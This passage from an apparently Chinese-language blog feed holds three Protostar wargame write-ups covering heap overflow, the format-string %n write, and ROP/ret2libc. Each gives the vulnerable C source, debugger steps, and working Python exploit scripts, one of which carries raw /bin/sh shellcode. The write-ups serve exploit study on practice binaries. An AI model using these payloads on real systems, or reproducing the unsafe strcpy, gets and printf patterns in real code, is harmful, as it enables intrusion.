    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/18/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/18/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/</id>
    <published>2017-04-18T03:12:19.000Z</published>
    <updated>2017-05-02T14:34:15.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><p><code>C代码</code></p><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;struct data {  char name[64];};struct fp {  int (*fp)();};void winner(){  printf(&quot;level passed\n&quot;);}void nowinner(){  printf(&quot;level has not been passed\n&quot;);}int main(int argc, char **argv){  struct data *d;  struct fp *f;  d = malloc(sizeof(struct data));  f = malloc(sizeof(struct fp));  f-&gt;fp = nowinner;  printf(&quot;data is at %p, fp is at %p\n&quot;, d, f);  strcpy(d-&gt;name, argv[1]);  f-&gt;fp();}</code></pre><h2 id="0x02-简单分析-amp-思考"><a href="#0x02-简单分析-amp-思考" class="headerlink" title="0x02 简单分析&amp;思考"></a>0x02 简单分析&amp;思考</h2><p>先在堆上分配了一个data和fp的结构体，然后使fp指向<code>nowinner</code>函数，然后打印对应分配的堆地址，以及将<code>argv[1]</code>复制到data结构体，最后调用<code>nowinner</code>函数。</p><p>可以知道我们需要去执行<code>winner</code>函数，怎么做到呢？</p><p>由于<code>strcpy</code>没对数据长度进行检查，那我们是否可以利用堆溢出将fp结构体里面的函数指针改为<code>winner</code>函数？Here we go！</p><h2 id="0x03-malloc"><a href="#0x03-malloc" class="headerlink" title="0x03 malloc()"></a>0x03 malloc()</h2><p>在继续分析之前，我们先来简单的介绍一下<code>malloc</code>函数，在这里<code>malloc</code>函数更多是对<code>mmap</code>系统调用函数的一个封装，为什么要封装呢？也就是为什么不直接调用<code>mmap</code>来进行堆分配，原因是为了方便堆的管理，简单的理解可以把堆看做一个很大的内存块。</p><p>那是如何管理堆的呢？见下</p><table><thead><tr><th>堆标志</th><th>分配大小</th><th>malloc返回地址addr</th></tr></thead><tbody><tr><td>00000000</td><td>00000011</td><td>00000000 00000000</td></tr><tr><td>00000000</td><td>00000031</td><td>AAAAAAAA BBBBBBBB</td></tr><tr><td>CCCCCCCC</td><td>DDDDDDDD</td><td>EEEEEEEE FFFFFFFF</td></tr><tr><td>…</td><td>…</td><td>…       …</td></tr><tr><td>00000000</td><td>00000011</td><td>00000000 00000000</td></tr></tbody></table><p>每次分配的时候会额外分配16字节的管理开销，来表示所分配堆的信息。比如可以通过<code>addr-4</code>拿到自身的分配大小从而决定下次分配的选择</p><p><strong>注：分配大小的第一位表示前面的内存块是否在使用</strong></p><h2 id="0x04-调试-amp-hack"><a href="#0x04-调试-amp-hack" class="headerlink" title="0x04 调试&amp;hack"></a>0x04 调试&amp;hack</h2><p>通过前面的分析，我们的目的很明确，需要通过<code>strcpy(d-&gt;name, argv[1]);</code>去重写fp结构体里面的函数指针，使其为<code>winner</code>函数的地址。</p><p>1.利用gdb查看strcpy前后堆的情况<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-0.png?raw=true" alt="0-0"><br>我们看到AAAABBBBCCC…分配到了data堆上，如果我们输入更长的数据，就可以将fp的<code>nowinner</code>地址改为<code>winner</code>地址</p><p>2.查看<code>winner</code>地址，重写fp函数指针</p><pre><code>(gdb) p winner $1 = {void (void)} 0x8048464 &lt;winner&gt;</code></pre><p>3.PoC Python脚本</p><pre><code>import structpadding = &quot;A&quot;*64 #填充datahead = &quot;BBBB&quot;  # not carehead += &quot;CCCC&quot; # not carewinner = struct.pack(&quot;I&quot;, 0x8048464) #将nowinner地址改为winner地址print padding+head+winner</code></pre><p>4.hack<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-1.png?raw=true" alt="0-1"><br>成功执行<code>winner</code>函数!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="堆溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-栈溢出学习-printf格式%n任意地址写</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/17/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/17/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/</id>
    <published>2017-04-17T03:12:19.000Z</published>
    <updated>2017-05-02T14:34:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p>从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int target;void vuln(char *string){  printf(string);  if(target) {      printf(&quot;you have modified the target :)\n&quot;);  }}int main(int argc, char **argv){  vuln(argv[1]);}</code></pre><h2 id="0x02-疑惑-amp-分析-amp-思考"><a href="#0x02-疑惑-amp-分析-amp-思考" class="headerlink" title="0x02 疑惑&amp;分析&amp;思考"></a>0x02 疑惑&amp;分析&amp;思考</h2><p>拿到这题，我和大家一样，哪里有可以利用的漏洞？？？就将一个命令行参数打印出来，很明显是让我们修改全局变量<strong>target</strong>的值。但好像除了<code>printf()</code>函数，就没有其他可疑的地方了。what fuck？ 一个<code>printf()</code>函数怎么会有漏洞？</p><p>但仔细观察可以发现这次<code>printf</code>的用法有点奇怪，直接打印一个字符串地址，很少会这样用，会不会就是这里？？？</p><h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>其他不说，先运行下程序试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-1.png?raw=true" alt="0-1"><br>再试着输入格式字符试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-2.png?raw=true" alt="0-2"><br>很奇怪，我们貌似得到一些栈中的值，再多打印一些试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-3.png?raw=true" alt="0-3"><br>可以看到后面打印出来了%x本身&lt;—<code>20782520</code>，通过linux stack layout可得知后面的确保存着参数字符串</p><pre><code>...local variables of mainsaved registers of mainreturn address of mainargcargvenvpstack from startup codeargcargv pointersNULL that ends argv[]environment pointersNULL that ends envp[]ELF Auxiliary Tableargv strings              &lt;--------focus hereenvironment stringsprogram nameNULL</code></pre><p><a href="http://www.win.tue.nl/~aeb/linux/hh/stack-layout.html" target="_blank" rel="external">更多关于linux栈布局</a></p><h2 id="0x04-你不知道的printf"><a href="#0x04-你不知道的printf" class="headerlink" title="0x04 你不知道的printf"></a>0x04 你不知道的printf</h2><p>虽然我们可以通过上面的方法查看栈内容，即泄漏地址等。但如何才能改变target值呢？</p><p>关注printf函数，有这么一段话：</p><ul><li>Code  such  as  printf(foo);  often indicates a bug, since foo may contain a % character.  If foo comes from untrusted user input, it may contain %n,causing the printf() call to write to memory and creating a security hole.</li></ul><p>简单就是说%n可以写入一个内存地址，其值为前面的字符数</p><ul><li>[n]The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument.  No argument is con‐verted.</li></ul><p>看个例子<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-4.png?raw=true" alt="0-4"><br>这样的话就可以满足写入的问题了，现在的问题就是写入哪里，怎么写了</p><h2 id="0x05-hack"><a href="#0x05-hack" class="headerlink" title="0x05 hack"></a>0x05 hack</h2><p>先利用<code>objdump -t</code>找到<code>target</code>的地址<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-5.png?raw=true" alt="0-5"><br>利用一句话Python反复测试</p><pre><code>/opt/protostar/bin/format1  &quot;`python -c &#39;print &quot;A&quot;*4 + &quot;\x38\x96\x04\x08&quot; + &quot;BBB&quot;+&quot;%x &quot;*135&quot;&#39;`&quot;</code></pre><p>调整%x的个数，使其target地址为最后一个<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-6.png?raw=true" alt="0-6"><br>然后将最后一个%x改为%n</p><pre><code>/opt/protostar/bin/format1  &quot;`python -c &#39;print &quot;A&quot;*4 + &quot;\x38\x96\x04\x08&quot; + &quot;BBB&quot;+&quot;%x &quot;*134+&quot;%n &quot;&#39;`&quot;</code></pre><p>run!<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-7.png?raw=true" alt="0-7"><br><strong>成功修改target值!</strong></p><h2 id="0x06-一点感悟"><a href="#0x06-一点感悟" class="headerlink" title="0x06 一点感悟"></a>0x06 一点感悟</h2><p>总的来说，自己受到了一点震感。So amazing！没想到一个printf使用不当就可能造成这么严重的漏洞。继续学习吧！</p><h2 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h2><ul><li><p><a href="http://www.win.tue.nl/~aeb/linux/hh/stack-layout.html" target="_blank" rel="external">更多关于linux栈布局</a></p></li><li><p><a href="http://stackoverflow.com/questions/3401156/what-is-the-use-of-the-n-format-specifier-in-c" target="_blank" rel="external">What is the use of the %n format specifier in C?</a></p></li><li><a href="http://liveoverflow.com/binary_hacking/protostar/format1.html" target="_blank" rel="external">Protostar/Format 1</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="printf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/printf/"/>
    
      <category term="format" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/format/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-栈溢出学习-ROP执行shellcode</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/16/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/16/Protostar-栈溢出系列学习-Stack 3/Protostar-栈溢出系列学习-Stack 3/</id>
    <published>2017-04-16T03:12:19.000Z</published>
    <updated>2017-05-02T14:33:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 和前面的栈溢出系列，我们覆盖了返回地址，通过ret控制eip使其执行我们在栈上存放的shellcode。这次，我们做了一些栈上的限制，比如现在的操作体系都会有DSP，ASLR等保护。本文就借此来学习一些ROP的知识。</p></blockquote><h2 id="0x01-stack3"><a href="#0x01-stack3" class="headerlink" title="0x01 stack3"></a>0x01 stack3</h2><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void getpath(){  char buffer[64];  unsigned int ret;  printf(&quot;input path please: &quot;); fflush(stdout);  gets(buffer);  ret = __builtin_return_address(0);  if((ret &amp; 0xbf000000) == 0xbf000000) {      printf(&quot;bzzzt (%p)\n&quot;, ret);      _exit(1);  }  printf(&quot;got path %s\n&quot;, buffer);}int main(int argc, char **argv){  getpath();}</code></pre><h2 id="0x02-思路-amp-分析"><a href="#0x02-思路-amp-分析" class="headerlink" title="0x02 思路&amp;分析"></a>0x02 思路&amp;分析</h2><p>整体上和前面的没太大区别，现在有个问题在于<code>__builtin_return_address()</code>会返回当前的返回地址值，然后后面<code>ret &amp; 0xbf000000) == 0xbf000000</code>对其返回地址进行了限制–返回地址不能是<code>0xbf</code>为前缀，正好是栈的前缀。这样的话就不能像之前那样直接返回到栈中，也不能执行栈上的shellcode。</p><p>怎么绕过呢？</p><p><strong>Ret2libc or ROP(return orientated programming)</strong></p><h2 id="0x03-ROP"><a href="#0x03-ROP" class="headerlink" title="0x03 ROP"></a>0x03 ROP</h2><p>一个巧妙的方法在于我们不直接返回到栈中执行shellcode，而是返回到原本的程序之中。这里我们返回到<code>getpath()</code>的ret指令处。在后面在存放shellcode，而再次执行ret时就会跳转到后面执行我们的shellcode。</p><h3 id="getpath-汇编"><a href="#getpath-汇编" class="headerlink" title="getpath()汇编"></a>getpath()汇编</h3><pre><code>Dump of assembler code for function getpath:0x08048484 &lt;getpath+0&gt;:    push   ebp0x08048485 &lt;getpath+1&gt;:    mov    ebp,esp0x08048487 &lt;getpath+3&gt;:    sub    esp,0x680x0804848a &lt;getpath+6&gt;:    mov    eax,0x80485d00x0804848f &lt;getpath+11&gt;:    mov    DWORD PTR [esp],eax0x08048492 &lt;getpath+14&gt;:    call   0x80483c0 &lt;printf@plt&gt;0x08048497 &lt;getpath+19&gt;:    mov    eax,ds:0x80497200x0804849c &lt;getpath+24&gt;:    mov    DWORD PTR [esp],eax0x0804849f &lt;getpath+27&gt;:    call   0x80483b0 &lt;fflush@plt&gt;0x080484a4 &lt;getpath+32&gt;:    lea    eax,[ebp-0x4c]0x080484a7 &lt;getpath+35&gt;:    mov    DWORD PTR [esp],eax0x080484aa &lt;getpath+38&gt;:    call   0x8048380 &lt;gets@plt&gt;0x080484af &lt;getpath+43&gt;:    mov    eax,DWORD PTR [ebp+0x4]0x080484b2 &lt;getpath+46&gt;:    mov    DWORD PTR [ebp-0xc],eax0x080484b5 &lt;getpath+49&gt;:    mov    eax,DWORD PTR [ebp-0xc]0x080484b8 &lt;getpath+52&gt;:    and    eax,0xbf0000000x080484bd &lt;getpath+57&gt;:    cmp    eax,0xbf0000000x080484c2 &lt;getpath+62&gt;:    jne    0x80484e4 &lt;getpath+96&gt;0x080484c4 &lt;getpath+64&gt;:    mov    eax,0x80485e40x080484c9 &lt;getpath+69&gt;:    mov    edx,DWORD PTR [ebp-0xc]0x080484cc &lt;getpath+72&gt;:    mov    DWORD PTR [esp+0x4],edx0x080484d0 &lt;getpath+76&gt;:    mov    DWORD PTR [esp],eax0x080484d3 &lt;getpath+79&gt;:    call   0x80483c0 &lt;printf@plt&gt;0x080484d8 &lt;getpath+84&gt;:    mov    DWORD PTR [esp],0x10x080484df &lt;getpath+91&gt;:    call   0x80483a0 &lt;_exit@plt&gt;0x080484e4 &lt;getpath+96&gt;:    mov    eax,0x80485f00x080484e9 &lt;getpath+101&gt;:    lea    edx,[ebp-0x4c]0x080484ec &lt;getpath+104&gt;:    mov    DWORD PTR [esp+0x4],edx0x080484f0 &lt;getpath+108&gt;:    mov    DWORD PTR [esp],eax0x080484f3 &lt;getpath+111&gt;:    call   0x80483c0 &lt;printf@plt&gt;0x080484f8 &lt;getpath+116&gt;:    leave  0x080484f9 &lt;getpath+117&gt;:    ret</code></pre><h3 id="调试-amp-hack"><a href="#调试-amp-hack" class="headerlink" title="调试&amp;hack"></a>调试&amp;hack</h3><p>测试返回地址等在这里就省略了，还不明白的可以看前面的系列。这里先看下python脚本。</p><pre><code>import structpadding =  &#39;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT&#39;ret  = struct.pack(&quot;I&quot;, 0x080484f9)eip_after_ret = struct.pack(&quot;I&quot;, 0xbffff78c+40)nopslide = &#39;\x90&#39;*100payload = &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&#39;print padding+ret+eip_after_ret+nopslide+payload</code></pre><p>这里的ret返回地址我们改为了<code>0x080484f9</code>正是ret指令处的地址。eip_after_ret为真正在栈上跳转的执行地址，当然我们也加入了nopslide。</p><p>here we go!</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-0.png?raw=true" alt="3-0"></p><p>成功运行bash！</p><h2 id="0x04-Ret2libc"><a href="#0x04-Ret2libc" class="headerlink" title="0x04 Ret2libc"></a>0x04 Ret2libc</h2><p>这次我们通过返回到libc里面的函数达到执行shell的目的。这里采用<code>system(&quot;/bin/sh&quot;)</code>。所以我们需要跳转到system函数，但同时要满足x86传参方式即要先将字符串<code>&quot;/bin/sh&quot;</code>压入栈中。下面我们就来做两件事：</p><pre><code>*  1，找到system在内存中的地址*  2，找到字符串`&quot;/bin/sh&quot;`在内存中的地址</code></pre><h3 id="system-amp-quot-bin-sh-quot"><a href="#system-amp-quot-bin-sh-quot" class="headerlink" title="system &amp; &quot;/bin/sh&quot;"></a><code>system</code> &amp; <code>&quot;/bin/sh&quot;</code></h3><p>  <img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-1.png?raw=true" alt="3-1"><br>  先找到<code>/lib/libc-2.11.2.so</code>在内存中的位置<br>  <img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-2.png?raw=true" alt="3-2"><br>  然后找到字符串<code>&quot;/bin/sh&quot;</code>在<code>/lib/libc-2.11.2.so</code>中的偏移<br> <img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-3.png?raw=true" alt="3-3"><br>验证：所以<code>&quot;/bin/sh&quot;</code>为<code>0xb7fb63bf</code><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-4.png?raw=true" alt="3-4"></p><h3 id="hack"><a href="#hack" class="headerlink" title="hack"></a>hack</h3><p>编写对应的Python脚本</p><pre><code>import structpadding =  &#39;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT&#39;system  = struct.pack(&quot;I&quot;,0xb7ecffb0) #system地址ret_after_system = &#39;AAAA&#39; #返回地址，不重要bin_sh = struct.pack(&quot;I&quot;, 0xb7fb63bf) #参数/bin/sh地址print padding+system+ret_after_system+bin_sh</code></pre><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-5.png?raw=true" alt="3-5"></p><h3 id="cooooool-make-it"><a href="#cooooool-make-it" class="headerlink" title="cooooool! make it!"></a>cooooool! make it!</h3><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>学习到现在，一句话总结就是：你知道得越多才知道知道得越少。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 和前面的栈溢出系列，我们覆盖了返回地址，通过ret控制eip使其执行我们在栈上存
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="栈溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
</feed>
